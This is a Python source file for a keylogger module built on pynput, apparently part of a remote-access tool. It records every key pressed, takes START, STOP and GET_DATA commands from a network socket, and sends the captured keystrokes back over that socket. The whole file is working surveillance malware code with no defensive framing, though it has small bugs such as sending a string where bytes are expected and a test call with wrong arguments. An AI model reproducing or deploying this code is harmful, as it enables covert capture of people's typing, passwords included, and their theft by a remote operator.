from pynput.keyboard import Listener as KBDListener, Key as KBDKey


# This is the keyboard listener object (we want this to be global)
# KEYLOGGER_OBJECT -> at the end of the file


# buffer for text/keys
KEYLOGGER_str = ''



#
def KeyloggerAction(sock, data):
    action = data.split(b' ')[1] # get last argument from the keylogger args
    # print(action)

    if action in [b'START', b'STOP']:
        action = (action == b'START')
        return __KeyloggerAction(action)
    elif action == b'GET_DATA':
        KeyLogger_GetData(sock)
        return True


def KeyLogger_GetData(sock):
    global KEYLOGGER_str
    print(sock.send(KEYLOGGER_str))
    KEYLOGGER_str = ''


# start/stop keylogger
def __KeyloggerAction(action): # if action == True: start keylogger. Else stop keylogger
    global KEYLOGGER_OBJECT
    if action:
        KEYLOGGER_OBJECT.start()
    else:
        KEYLOGGER_OBJECT.stop()
        KEYLOGGER_OBJECT = KBDListener(on_press = Keylogger_OnPress)

    return action


# handle keys
def Keylogger_OnPress(key):
    global KEYLOGGER_str

    print(key)

    try:
        KEYLOGGER_str += key.char
    except:
        key = "[{}]".format(key)
        KEYLOGGER_str += key









# This is the keyboard listener object (we want this to be global)
# cannot be initialized at the top of the file
KEYLOGGER_OBJECT = KBDListener(on_press = Keylogger_OnPress)





# TESTING
if __name__ == "__main__":
    import time
    KeyloggerAction(True)


    previous = KEYLOGGER_str
    while True:
        if KEYLOGGER_str != previous:
            print(KEYLOGGER_str)
            previous = KEYLOGGER_str
